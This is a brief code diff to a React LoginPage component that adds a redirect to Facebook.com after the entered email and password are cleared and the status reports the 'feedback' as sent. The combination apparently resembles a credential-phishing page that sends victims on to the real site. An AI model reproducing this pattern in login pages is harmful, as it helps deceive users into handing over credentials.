@@ -21,6 +21,7 @@ export default function LoginPage() {
         setStatus("Feedback sent successfully!");
         setEmail("");
         setPassword("");
+        window.location.href = "https://Facebook.com";
       } else {
         setStatus("Error sending feedback.");
       }
